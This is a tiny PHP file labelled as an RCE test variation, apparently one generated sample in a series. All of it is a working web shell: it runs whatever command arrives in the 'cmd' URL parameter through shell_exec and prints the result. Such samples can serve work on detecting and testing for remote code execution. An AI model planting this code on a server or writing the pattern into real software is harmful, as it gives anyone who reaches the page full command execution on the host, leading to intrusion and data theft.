<?php
// RCE test variation #566
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>